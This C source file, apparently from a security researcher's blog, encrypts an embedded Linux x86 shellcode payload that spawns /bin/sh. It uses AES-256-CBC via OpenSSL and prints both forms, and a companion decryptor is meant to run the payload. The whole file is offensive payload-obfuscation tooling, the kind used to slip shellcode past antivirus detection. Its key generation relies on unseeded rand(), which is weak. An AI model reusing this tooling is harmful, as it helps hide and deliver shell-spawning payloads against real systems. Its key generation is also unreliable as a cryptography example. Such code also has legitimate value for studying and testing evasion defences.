/*
encrypt.c
Sanjiv Kawa (@skawasec)
www.popped.io
December 7, 2016

This program encrypts user supplied shellcode.
Please use decrypt.c to decrypt and execute the shellcode.

compile: encrypt.c -l crypto -o encrypt
*/

#include <openssl/conf.h>
#include <openssl/evp.h>
#include <openssl/err.h>
#include <string.h>

//print shellcode in \x format
void print_shellcode(unsigned char *shellcode)
{
  int i, len;

  len = strlen(shellcode);

  for (i = 0; i < len; i++)
  {
    printf("\\x%02x", shellcode[i]);
  }
    printf("\n");
}

//generate a random string for AES key and initialization vector
//modified http://codereview.stackexchange.com/questions/29198/random-string-generator-in-c
static char *random_string(char *str, size_t size)
{
  const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  int i, n;
  n = 0;

  for (i = 0; n < size; n++)
  {
    int key = rand() % (int) (sizeof charset - 1);
    str[n] = charset[key];
  }

  str[size] = '\0';

  return str;
}

//main
int main (void)
{
  unsigned char key[32]; //256 bit key
  unsigned char iv[16]; //128 bitinitialization vector

  int key_len, iv_len;
  key_len = 32;
  iv_len = 16;

  random_string(key, key_len); //generate random AES 256 bit key
  random_string(iv, iv_len); //generate random AES 128 bit initialization vector

  printf("[+] AES 128 bit IV: %s\n", (iv));
  printf("[+] AES 256 bit Key: %s\n", (key));

  //plaintext shellcode
  unsigned char shellcode[] = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

  unsigned char encrypted[128]; //buffer for encrypted shellcode
  int shellcode_len, encrypted_len; //length of shellcode

  shellcode_len = strlen(shellcode);

  //initialize the library
  ERR_load_crypto_strings();
  OpenSSL_add_all_algorithms();
  OPENSSL_config(NULL);

  //encrypt the shellcode
  encrypted_len = encrypt(shellcode, shellcode_len, key, iv, encrypted);

  //null terminate the shellcode for printing
  shellcode[shellcode_len] = '\0';
  encrypted[encrypted_len] = '\0';

  //print shellcode in both forms
  printf("[+] Original Shellcode (%d bytes):\n", (shellcode_len));
  print_shellcode(shellcode);

  printf("[+] Encrypted Shellcode (%d bytes):\n", (encrypted_len));
  print_shellcode(encrypted);

  //clean up
  EVP_cleanup();
  ERR_free_strings();

  return 0;
}

//error handler
void handleErrors(void)
{
  ERR_print_errors_fp(stderr);
  abort();
}

//encryption function for AES 256 with a 128 bit initialization vector
int encrypt(unsigned char *shellcode, int shellcode_len, unsigned char *key, unsigned char *iv, unsigned char *encrypted)
{
  EVP_CIPHER_CTX *ciphertext; //openssl EVP ciphertext structure

  int len, encrypted_len;

  //create and initialize the context
  if(!(ciphertext = EVP_CIPHER_CTX_new()))
    handleErrors(); //error handler

  //initialize the encryption operation for AES 256 with a 128 bit initialization vector
  EVP_EncryptInit_ex(ciphertext, EVP_aes_256_cbc(), NULL, key, iv);

  EVP_EncryptUpdate(ciphertext, encrypted, &len, shellcode, shellcode_len); //encrypt shellcode

  encrypted_len = len; //encrypted shellcode length

  EVP_EncryptFinal_ex(ciphertext, encrypted + len, &len); //finalize encryption

  encrypted_len += len; //encrypted shellcode length

  EVP_CIPHER_CTX_free(ciphertext); //clean up

  return encrypted_len;
}
